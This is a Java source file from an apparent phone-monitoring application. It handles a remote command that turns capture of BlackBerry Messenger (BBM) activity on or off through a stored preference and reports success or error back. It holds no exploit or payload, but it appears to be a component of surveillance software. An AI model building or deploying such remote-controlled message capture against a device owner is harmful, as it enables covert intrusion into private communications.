package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCBBM extends PCCRmtCmdAsync {
	
	private int mode = 0;
	
	public PCCBBM(int mode) {
		this.mode = mode;
	}
	
	private void doPCCHeader() {
		responseMessage.delete(0, responseMessage.length());
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		// responseMessage.append(PhoneixCompliantCommand.IM.getId());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// Runnable
	public void run() {
		doPCCHeader();
		try {
			Preference pref = Global.getPreference();
			PrefMessenger messenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			if (mode == DISABLE) {
				messenger.setBBMEnabled(false);
			} else {
				messenger.setBBMEnabled(true);
			}
			pref.commit(messenger);
			responseMessage.append(Constant.OK);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
